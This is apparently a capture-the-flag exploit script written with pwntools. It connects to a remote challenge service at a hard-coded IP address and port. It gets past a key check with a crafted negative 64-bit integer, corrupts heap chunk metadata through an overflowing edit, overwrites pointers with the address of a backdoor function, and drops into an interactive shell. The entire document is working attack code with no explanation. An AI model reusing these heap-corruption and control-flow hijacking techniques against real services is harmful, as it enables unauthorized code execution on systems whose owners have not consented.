from pwn import *
context.log_level="debug"
# sh=process("./pwn")
sh=remote("116.236.144.37",23360)
fkey=b'-9223372036854775796'
skey=b'1'
sh.sendlineafter(b"Input the first key: \n",fkey)
sh.sendlineafter(b"Input the second key: \n",skey)
def cmd(c):
    sh.sendlineafter(b"choice:",str(c).encode())
def add(size,ctt):
    cmd(2)
    sh.sendlineafter(b"Please enter the length of the item:",str(size).encode())
    sh.sendlineafter(b"Please enter the name of item:",ctt)
def edit(idx,size,ctt):
    cmd(3)
    sh.sendlineafter(b"Please enter the index of item:",str(idx).encode())
    sh.sendlineafter(b"Please enter the length of item:",str(size).encode())
    sh.sendlineafter(b"Please enter the new name of the item:",ctt)
def delete(idx):
    cmd(4)
    sh.sendlineafter(b"Please enter the index of item:",str(idx).encode())
def show():
    cmd(1)
fakechunk=0x403fed
offset=0x33
backdoor=0x401765
add(0x10,b'nihao') #0
add(0x10,b"nihao1") #1
add(0x10,b"nihao2") #2
delete(2)
delete(1)
edit(0, 0x10+0x10, b'a'*0x10+p64(0)+p64(0x21))
add(0x10,b'nihao')
add(0x10,p64(backdoor)*2)
# gdb.attach(sh)
cmd(5)
sh.interactive()